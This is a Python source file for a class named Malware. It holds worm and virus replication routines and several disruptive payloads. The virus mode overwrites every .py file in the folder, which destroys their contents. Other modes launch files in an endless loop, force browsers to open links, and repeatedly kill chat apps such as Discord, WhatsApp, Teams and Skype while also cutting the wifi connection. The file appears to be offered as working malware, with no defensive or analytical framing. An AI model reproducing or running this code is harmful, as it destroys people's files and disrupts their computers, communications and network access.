import subprocess
import os
import glob
import time
name = "a"
filename = os.path.basename(__file__)
class Malware:
    def Replicate(self, Mode):
        global name
        name = name + "a"
        f = open("code.txt", "r")
        virus_code = f.readlines()
        if Mode == "WORM":
            subprocess.run(f"copy {filename} {name}.py", shell=True)
        elif Mode == "VIRUS":
            for file in glob.glob("*.py"):
                with open(file, "w") as fil:


                        fil.writelines(virus_code)

            print("No more hosts found")
    def Payload(self, Mode, **custom_link):
        if Mode == "CRASH":
            for file in glob.glob("*.py"):
                while True:
                    os.startfile(file)
        if Mode == "RICKROLL":
            subprocess.run("start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ", shell=True)
            subprocess.run("start opera https://www.youtube.com/watch?v=dQw4w9WgXcQ", shell=True)
            subprocess.run("start firefox https://www.youtube.com/watch?v=dQw4w9WgXcQ", shell=True)
        if Mode == "CLNK":
            subprocess.run(f"start chrome {custom_link}", shell=True)
            subprocess.run(f"start opera {custom_link}", shell=True)
            subprocess.run(f"start firefox {custom_link}", shell=True)
        if Mode == "CHATDOS":
            while True:
                subprocess.run("taskkill /IM discord.exe /F", shell=True)
                subprocess.run("taskkill /IM whatsapp.exe /F", shell=True)
                subprocess.run("taskkill /IM teams.exe /F", shell=True)
                subprocess.run("taskkill /IM skype.exe /F", shell=True)
                time.sleep(10)
        if Mode == "INETDOS":
            while True:
                subprocess.run("netsh wlan disconnect", shell=True)
                time.sleep(30)
        if Mode == "DOS":
            while True:
                subprocess.run("taskkill /IM discord.exe /F", shell=True)
                subprocess.run("taskkill /IM whatsapp.exe /F", shell=True)
                subprocess.run("taskkill /IM teams.exe /F", shell=True)
                subprocess.run("taskkill /IM skype.exe /F", shell=True)
                subprocess.run("netsh wlan disconnect", shell=True)
                time.sleep(10)
            
